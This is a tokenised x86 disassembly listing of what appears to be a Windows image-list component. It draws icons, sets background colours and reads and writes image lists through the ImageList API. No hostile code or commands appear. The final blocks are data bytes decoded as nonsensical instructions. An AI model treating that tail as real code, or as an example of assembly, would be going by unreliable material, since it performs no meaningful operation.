mov eax [ ebp - 0x4 ]
call sub_44d644
push eax
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44d644
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
push eax
call ImageList_Add
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d809
mov eax [ ebp - 0x10 ]
call sub_40324c
retn
sub_44d83c
push ebx
mov ebx eax
mov eax ebx
call sub_44d4f8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_44d634
push eax
call ImageList_GetImageCount
pop ebx
retn
sub_44d860
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44d8df
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_44d83c
cmp esi eax
jl r-xdata
mov eax ebx
call sub_44d4f8
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405eac
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b938
call sub_4039d8
mov eax ebx
mov si 0xffef
call sub_403448
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d8e6
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
push esi
mov eax ebx
call sub_44d634
push eax
call ImageList_Remove
sub_44d8f8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44d4f8
test al al
je r-xdata
mov [ ebx + 0x44 ] esi
mov eax esi
call sub_44d348
push eax
mov eax [ ebx + 0x3c ]
push eax
call ImageList_SetBkColor
jmp r-xdata
mov eax ebx
mov si 0xffef
call sub_403448
pop esi
pop ebx
retn
sub_44d930
push ebx
mov ebx eax
mov eax ebx
call sub_44d4f8
test al al
je r-xdata
mov eax [ ebx + 0x44 ]
pop ebx
retn
mov eax ebx
call sub_44d634
push eax
call ImageList_GetBkColor
call sub_44d368
pop ebx
retn
sub_44d958
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax ebx
call sub_44d4f8
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebx + 0x54 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x48 ]
call sub_44d348
push eax
mov eax ebx
call sub_44d930
call sub_44d348
push eax
push 0x0
push 0x0
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax edi
call sub_423e68
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_44d634
push eax
call ImageList_DrawEx
jmp r-xdata
mov eax [ ebx + 0x54 ]
call sub_428754
mov eax [ eax + 0x14 ]
mov edx 0xffffff
call sub_423720
mov eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebx + 0x34 ]
xor edx edx
xor eax eax
call sub_418e04
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebx + 0x54 ]
call sub_428754
pop edx
call sub_423ac4
push 0x0
push 0x0
push 0xffffffff
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebx + 0x54 ]
call sub_428754
call sub_423e68
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_44d634
push eax
call ImageList_DrawEx
mov eax [ ebp + 0x10 ]
add eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp + 0x14 ]
add ecx [ ebx + 0x34 ]
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0x14 ]
call sub_418e04
mov eax [ ebx + 0x54 ]
call sub_428754
call sub_423e68
mov [ ebp - 0x8 ] eax
mov eax [ edi + 0x14 ]
mov edx 0xff000014
call sub_423720
mov eax edi
call sub_423e68
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
inc eax
push eax
mov eax [ ebp + 0x14 ]
inc eax
push eax
push esi
call BitBlt
mov eax [ edi + 0x14 ]
mov edx 0xff000010
call sub_423720
mov eax edi
call sub_423e68
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
push esi
call BitBlt
mov dl 0x1
mov eax [ r-xdata ]
call sub_42818c
mov esi eax
mov [ ebx + 0x54 ] esi
mov dl 0x1
mov eax esi
call sub_4294c4
mov edx [ ebx + 0x34 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ ebx + 0x30 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
sub_44db2c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov bl [ eax + 0x40 ]
push ebx
mov bl [ eax + 0x43 ]
push ebx
mov bl [ ebp + 0x8 ]
push ebx
call sub_44db50
pop ebx
pop ebp
retn 0xc
sub_44db50
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_44d4f8
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x14
push edi
mov eax [ ebp + 0x18 ]
push eax
xor eax eax
mov al [ ebp + 0x10 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebp + 0xc ]
or eax [ edx * 4 + rw-data ]
push eax
mov al [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp + 0x14 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_44db9c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_418e04
mov eax [ ebp - 0x4 ]
call sub_44e830
xor eax eax
push ebp
push sub_44dd35
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_42818c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44dd18
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42818c
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44dcfb
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ ebp - 0x10 ]
call sub_4294c4
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x8 ]
push eax
call ImageList_GetImageCount
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44dd02
mov eax [ ebp - 0x10 ]
call sub_40324c
retn
inc esi
xor ebx ebx
mov eax [ ebp - 0xc ]
call sub_428754
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x14 ]
call sub_423ac4
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_423e68
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov eax [ ebp - 0x10 ]
call sub_428754
mov [ ebp - 0x18 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
call sub_423ac4
push 0x10
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
call sub_423e68
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44d770
cmp ebx edi
jne r-xdata
cmp edi 0xffffffff
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_44dd44
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_44d634
mov edx eax
or ecx 0xffffffff
mov eax ebx
call sub_44db9c
sub_44dd64
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
mov eax ebx
call sub_44d698
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_41a7dc
mov eax ebx
call sub_44d8ec
mov al [ esi + 0x41 ]
mov [ ebx + 0x41 ] al
mov al [ esi + 0x43 ]
mov [ ebx + 0x43 ] al
mov dl [ esi + 0x40 ]
mov eax ebx
call sub_44df4c
mov al [ esi + 0x42 ]
mov [ ebx + 0x42 ] al
mov eax esi
call sub_44d634
mov edx eax
mov eax ebx
call sub_44d5d0
mov eax ebx
call sub_44d4f8
test al al
jne r-xdata
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax ebx
call sub_44d634
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_44d500
jmp r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_44d634
push eax
call ImageList_GetBkColor
call sub_44d368
mov edx eax
mov eax ebx
call sub_44d8f8
mov eax [ esi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov edx esi
mov eax ebx
call sub_44dd44
jmp r-xdata
sub_44de24
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_41a8c0
pop esi
pop ebx
retn
mov al [ esi + 0x41 ]
mov [ ebx + 0x41 ] al
mov al [ esi + 0x43 ]
mov [ ebx + 0x43 ] al
mov dl [ esi + 0x40 ]
mov eax ebx
call sub_44df4c
mov al [ esi + 0x42 ]
mov [ ebx + 0x42 ] al
mov eax [ esi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov eax ebx
call sub_44d8ec
mov eax esi
call sub_44d634
mov edx eax
mov eax ebx
call sub_44d5d0
mov eax ebx
call sub_44d4f8
test al al
jne r-xdata
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax ebx
call sub_44d634
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_44d500
jmp r-xdata
mov eax esi
call sub_44d634
push eax
call ImageList_GetBkColor
call sub_44d368
mov edx eax
mov eax ebx
call sub_44d8f8
mov edx esi
mov eax ebx
call sub_44dd44
pop esi
pop ebx
retn
sub_44ded4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44df40
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44df47
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
cmp eax [ ebx + 0x30 ]
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405eac
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b938
call sub_4039d8
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
cmp eax [ ebx + 0x34 ]
jge r-xdata
sub_44df74
push ebx
push esi
push edi
push ebp
mov ebx eax
mov [ ebx + 0x58 ] 0x1
cmp [ ebx + 0x5c ] 0x0
jg r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
inc edi
xor ebp ebp
mov edx ebp
mov eax [ ebx + 0x4c ]
call sub_41a238
mov si 0xffff
call sub_403448
inc ebp
dec edi
jne r-xdata
sub_44dfc4
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
xor eax eax
mov [ ebp + 0x4 ] eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_41a128
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_41a238
cmp ebp eax
jne r-xdata
sub_44e01c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ esi + 0x4 ]
mov eax [ ebx + 0x4 ]
call sub_40800c
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_44e060
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi edx
mov esi eax
test edi edi
je r-xdata
mov [ ebp - 0x1 ] 0x0
jmp r-xdata
mov eax esi
call sub_44d83c
mov ebx eax
mov eax edi
call sub_44d83c
cmp ebx eax
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_44d83c
test eax eax
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44e13c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44e11f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_44e01c
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e126
mov eax [ ebp - 0xc ]
call sub_40324c
retn
mov eax edi
call sub_44d83c
test eax eax
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
sub_44e150
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_44d83c
test eax eax
setg al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_44e060
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_44e1aa
mov eax eax
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_41ff50
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
push ebp
call sub_44e150
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44e204
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x18 ]
mov ecx 0x4
mov eax ebx
call sub_41c0a4
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax ebx
call sub_41c0a4
mov dl 0x1
mov eax [ r-xdata ]
call sub_42818c
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44e488
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41be78
mov esi eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov eax [ ebp - 0x18 ]
add eax esi
cdq
push edx
push eax
mov eax ebx
call sub_41be98
mov dl 0x1
mov eax [ r-xdata ]
call sub_42818c
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44e46b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42818c
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42818c
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ ebp - 0x14 ]
call sub_4294c4
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_418e04
mov eax [ ebp - 0x4 ]
call sub_44e830
xor eax eax
push ebp
push sub_44e44e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x30 ]
cdq
idiv ecx
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e455
mov eax [ ebp - 0xc ]
call sub_40324c
mov eax [ ebp - 0x14 ]
call sub_40324c
mov eax [ ebp - 0x4 ]
call sub_44e834
retn
inc eax
mov [ ebp - 0x20 ] eax
xor edi edi
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x34 ]
cdq
idiv ecx
mov esi eax
dec esi
test esi esi
jl r-xdata
inc edi
dec [ ebp - 0x20 ]
jne r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_418e2c
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_428754
push eax
mov eax [ ebp - 0xc ]
call sub_428754
lea edx [ ebp - 0x30 ]
pop ecx
call sub_423990
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_418e2c
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_428754
push eax
mov eax [ ebp - 0x14 ]
call sub_428754
lea edx [ ebp - 0x30 ]
pop ecx
call sub_423990
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44d770
dec [ ebp - 0x1c ]
inc ebx
dec esi
jne r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_44e498
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4206d0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44e4f8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_44d608
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e4ff
mov eax [ ebp - 0xc ]
call sub_40324c
retn
sub eax 0xffffffec
sub_44e4ff
mov eax [ ebp - 0x4 ]
call sub_44d4f8
test al al
jne r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor ebx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44e62e
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
call sub_41be98
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_41c5a0
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_41be98
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x11 ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_40324c
retn
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
call sub_41be98
push 0x0
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4206d0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44e611
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x38
mov eax [ ebp - 0x10 ]
call sub_41be98
lea edx [ ebp - 0x12 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_44d608
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_40324c
retn
sub eax 0xffffffec
mov al [ ebp - 0x12 ]
or [ ebp - 0x11 ] al
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_41be98
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
dec eax
sete bl
sub_44e660
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov eax esi
call sub_44d698
mov eax edi
call sub_41be78
mov [ esp + 0xc ] eax
mov edx esp
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ esp + 0x4 ]
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
mov bl [ esp ]
and bl 0xff
mov ax [ esp ]
shr ax 0x8
mov [ esp + 0x8 ] al
mov eax [ esp + 0xc ]
cdq
push edx
push eax
mov eax edi
call sub_41be98
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx edi
mov eax esi
call sub_44e204
cmp bl 0x49
jne r-xdata
cmp [ esp + 0x8 ] 0x4c
jne r-xdata
mov edx edi
mov eax esi
call sub_44e498
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_44e6ea
mov eax eax
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_4206d0
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44e7e6
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax r-xdata
call sub_40c1d0
mov [ rw-data ] eax
cmp [ rw-data ] 0x60000
jb r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
push r-xdata
call GetModuleHandleA
mov edi eax
test edi edi
je r-xdata
push eax
mov eax ebx
call sub_44d634
push eax
call ImageList_Write
test eax eax
jne r-xdata
sub eax 0xffffffec
push eax
push 0x1
mov eax ebx
call sub_44d634
push eax
call [ rw-data ]
test eax eax
je r-xdata
sub eax 0xffffffec
push r-xdata
push edi
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e7ed
mov eax [ ebp - 0x4 ]
call sub_40324c
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9f4
call sub_4039d8
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9f4
call sub_4039d8
jmp r-xdata
sub_44e854
push ebx
push esi
call sub_4035d8
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40323c
test bl bl
jle r-xdata
mov edx esi
call sub_44dfc4
pop esi
pop ebx
retn
mov eax esi
call sub_4035c0
sub_44e8a0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_44e8c5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e8cc
retn
sub_44ec10
fdivr st6
inc esp
add [ eax - 0x1 ] cl
inc esp
add [ edi + edi * 8 + 0x44 ] bh
add [ eax + 0xc0044ff ] dh
add [ ebp ] al
sub al 0x0
inc ebp
add [ eax + eax + 0x45 ] cl
add [ eax + eax + 0x45 ] ch
add [ eax - 0x73ffbb36 ] dl
add [ ebp ] al
cwde
0x44
sub_44ec40
test al 0x0
inc ebp
add ah cl
add [ ebp ] al
in al dx
add [ ebp ] al
or al 0x1
inc ebp
add al ch
std
inc esp
add [ edi ] cl
push esp
dec ebp
outsb
jne r-xdata
test al 0x34
inc eax
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
aam 0x1
inc ebp
add [ eax + 0x2a ] ah
inc ebp
add ah ah
pop es
inc ebp
add ah bl
cmpsd [ esi ] [ edi ]
inc ecx
add [ esi + eax ] ch
inc ebp
add al bl
sub al [ ebp ]
cmp [ eax ] al
inc edx
add [ eax ] dh
add [ edx ] eax
pushad
add eax [ edx ]
dec eax
add [ edx ] al
inc eax
add [ edx ] al
push 0x58004203
add [ ebp ] eax
test al 0x1c
inc ebp
add [ eax ] bh
or al [ ebp ]
pop eax
push ds
inc ebp
add ah al
and eax 0x23800045
inc ebp
add [ eax + 0xe004524 ] bh
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah dh
adc [ eax ] al
xor [ eax ] al
add [ eax ] al
hlt
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
clc
in al dx
inc esp
add [ ebp + ebp * 8 + 0x44 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] dl
in eax dx
inc esp
add [ esi ] bh
in eax dx
inc esp
add [ eax + eax - 0x74fc0000 ] ch
inc ecx
add [ eax + 0x3 ] cl
inc edx
add [ eax - 0x63ffbfcc ] ah
cld
inc ecx
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add ah dl
add [ ebp ] eax
pushad
sub al [ ebp ]
